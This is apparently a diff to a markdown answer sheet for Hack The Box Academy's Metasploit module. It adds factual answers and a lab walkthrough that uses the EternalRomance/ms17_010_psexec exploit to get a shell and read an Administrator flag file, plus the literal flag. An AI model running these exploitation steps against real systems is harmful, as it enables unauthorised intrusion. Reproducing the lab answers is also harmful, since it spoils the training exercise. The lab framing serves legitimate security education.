@@ -1658,6 +1658,35 @@ Results:
 
 ## [Using the Metasploit Framework](https://academy.hackthebox.com/module/details/39)
 
+### Introduction to Metasploit
+
+**Which version of Metasploit comes equipped with a GUI interface?**
+
+Results: Metasploit Pro
+
+
+**What command do you use to interact with the free version of Metasploit?**
+
+Results: msfconsole
+
+### MSF Components
+
+**Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.**
+
+```
+msfconsole -q
+
+search EternalRomance
+use exploit/windows/smb/ms17_010_psexec
+
+#set options, run, and obtain a meterpreter
+shell
+type C:/Users/Administrator/Desktop/flag.txt
+```
+
+Results: HTB{MSF-W1nD0w5-3xPL01t4t10n}
+
+
 ## [Password Attacks](https://academy.hackthebox.com/module/details/147)
 
 ## [Attacking Common Services](https://academy.hackthebox.com/module/details/116)
